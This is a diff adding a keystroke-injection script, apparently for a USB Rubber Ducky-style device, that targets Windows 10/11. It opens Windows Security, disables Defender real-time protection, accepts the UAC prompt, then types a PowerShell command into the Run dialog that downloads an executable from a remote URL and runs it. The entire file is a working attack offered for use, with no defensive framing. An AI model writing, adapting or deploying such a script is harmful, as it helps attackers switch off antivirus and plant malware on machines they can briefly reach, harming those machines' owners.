@@ -1,0 +1,70 @@
+REM Title: Remote Shell Execution via PowerShell
+REM Author: haruslah
+REM Version: 1.0
+REM Description: This script opens Windows Security settings, disables real-time protection,
+REM              and then downloads and executes a payload from a remote server.
+REM Note: The code assumes your payload is payload.exe, change it to whatever your payload name is.
+REM Target: Windows 10/11
+
+REM --- Configuration ---
+DEFINE #DOWNLOAD_URL http://<payload-url>
+DEFINE #DEST_PATH C:\ProgramData\payload.exe
+
+REM --- Timing Delays (in ms) ---
+DEFINE #KEY_DELAY 50
+DEFINE #UI_DELAY 500
+DEFINE #LONG_DELAY 2000
+
+REM --- Start of Payload ---
+
+REM Open Start Menu
+GUI
+
+DELAY #UI_DELAY
+REM Type "Windows Security" to search
+STRING windows security
+DELAY #UI_DELAY
+ENTER
+DELAY #LONG_DELAY
+
+REM Navigate to "Virus & Threat Protection"
+ENTER
+DELAY #LONG_DELAY
+
+REM Navigate to "Virus & threat protection settings"
+REM This assumes the focus starts on the "Home" icon.
+REM The number of TABS may need adjustment based on the Windows version.
+REM Tested on Windows 11
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+TAB
+DELAY #KEY_DELAY
+ENTER
+DELAY #UI_DELAY
+
+
+REM Disable "Real-time protection"
+REM This will trigger a UAC prompt.
+SPACE
+DELAY #LONG_DELAY
+
+REM Confirm the UAC prompt by pressing Alt+Y
+ALT y
+DELAY #LONG_DELAY
+
+REM Close the Windows Security window
+ALT F4
+DELAY #UI_DELAY
+
+REM Open the Run dialog
+GUI r
+DELAY #UI_DELAY
+
+REM Construct and execute the PowerShell command for download and execution
+STRING powershell -Command "Invoke-WebRequest -Uri #DOWNLOAD_URL -OutFile '#DEST_PATH'; & '#DEST_PATH'"
+DELAY #UI_DELAY
+ENTER
